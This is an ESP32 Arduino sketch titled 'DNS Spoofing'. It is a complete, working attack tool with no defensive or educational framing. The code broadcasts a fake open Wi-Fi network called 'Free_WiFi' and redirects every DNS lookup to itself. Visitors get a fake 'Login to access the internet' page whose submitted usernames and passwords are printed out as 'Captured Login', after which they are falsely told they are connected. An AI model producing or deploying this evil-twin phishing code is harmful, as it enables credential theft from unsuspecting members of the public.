ESP32-DNS_Spoofing : 

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// Configuration
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);  // Gateway IP

DNSServer dnsServer;
WebServer server(80);

// Fake Wi-Fi name
const char *ssid = "Free_WiFi";

// HTML Login Page
const char *loginPage = R"rawliteral(
<html>
  <head><title>Login</title></head>
  <body>
    <h2 style="font-family:sans-serif;">Login to access the internet</h2>
    <form action="/login" method="POST">
      Username: <input type="text" name="user"><br><br>
      Password: <input type="password" name="pass"><br><br>
      <input type="submit" value="Login">
    </form>
  </body>
</html>
)rawliteral";

// Serve login page
void handleRoot() {
  server.send(200, "text/html", loginPage);
}

// Handle login form
void handleLogin() {
  String username = server.arg("user");
  String password = server.arg("pass");

  // Print captured credentials
  Serial.println("🔐 Captured Login:");
  Serial.println("👤 Username: " + username);
  Serial.println("🔑 Password: " + password);
  Serial.println("---------------------------");

  // Show thank-you page
  server.send(200, "text/html", "<h1>Thank you! You're now connected.</h1>");
}

// Redirect all unknown paths to login page (captive portal)
void handleNotFound() {
  server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("🔧 Starting ESP32-Spoofer...");

  // Start fake access point
  WiFi.softAP(ssid);
  delay(500);

  // Start DNS spoofing — redirect all domains to ESP32 IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Set up web server routes
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleNotFound);  // <- redirects unknown URLs

  server.begin();

  Serial.println("✅ Fake AP started!");
  Serial.print("📶 SSID: "); Serial.println(ssid);
  Serial.print("🌐 IP: "); Serial.println(WiFi.softAPIP());
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
